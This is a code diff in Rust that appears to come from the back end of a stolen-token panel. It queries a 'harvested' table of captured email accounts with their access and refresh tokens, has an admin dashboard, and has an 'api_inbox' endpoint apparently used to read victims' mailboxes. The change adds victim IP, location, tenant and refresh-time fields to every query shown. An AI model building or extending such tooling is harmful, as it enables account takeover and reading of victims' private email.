@@ -132,7 +132,7 @@ pub async fn retrieve_any_token(state: &AppState, token_id: &str) -> anyhow::Res
     }
     // Fall back to harvested table (legacy plain-text storage)
     let row: HarvestedToken = sqlx::query_as(
-        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?"
+        "SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?"
     )
     .bind(token_id)
     .fetch_one(&state.pool)
@@ -617,7 +617,7 @@ pub struct InboxApiQuery {
 }
 
 async fn api_inbox(query: web::Query<InboxApiQuery>, state: web::Data<AppState>) -> impl Responder {
-    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested WHERE id = ?")
+    let row: Option<HarvestedToken> = sqlx::query_as("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested WHERE id = ?")
         .bind(&query.token_id)
         .fetch_optional(&state.pool)
         .await
@@ -862,7 +862,7 @@ async fn root_status() -> impl Responder {
 
 // HTML admin dashboard (with View Inbox button)
 async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
-    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source FROM harvested ORDER BY captured_at DESC")
+    let rows = sqlx::query_as::<_, HarvestedToken>("SELECT id, email, access_token, refresh_token, expires_at, captured_at, source, ip_address, location, tenant_id, category, last_refreshed_at FROM harvested ORDER BY captured_at DESC")
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
